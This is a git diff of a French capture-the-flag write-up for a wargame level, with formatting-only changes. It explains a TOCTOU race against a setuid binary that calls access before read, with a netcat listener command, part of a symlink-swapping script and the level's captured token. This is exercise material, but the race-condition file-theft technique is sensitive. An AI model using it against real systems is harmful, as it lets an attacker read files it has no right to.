@@ -106,11 +106,11 @@ int32_t main(int32_t argc, char** argv, char** envp)
 
 Le main nous apprend 2 choses : 
 - On cherche une connection sur le port 6969    
-(donc on doit lancer une connection avec ``` nc -lk 6969```)
+(donc on doit lancer une connection avec `nc -lk 6969`)
 - On utilise access avant de read, donc on peut faire un TOCTOU (Time Of Check to Time Of Use)
 
 voici un petit script pour mettre ca en place :
-```script.sh
+```bash
 #!/bin/bash
 
 # Nom du lien symbolique
@@ -133,5 +133,3 @@ Il faut au prealable creer test (dans /tmp) et donner les droits d'exec au scrip
 Puis lancer : ```/tmp/script.sh & ./level10 /tmp/my_link 127.0.0.1```
 
 Avec un peu de chance (timing) ca donnera le token : ```woupa2yuojeeaaed06riuj63c```
-
-feulo4b72j7edeahuete3no7c
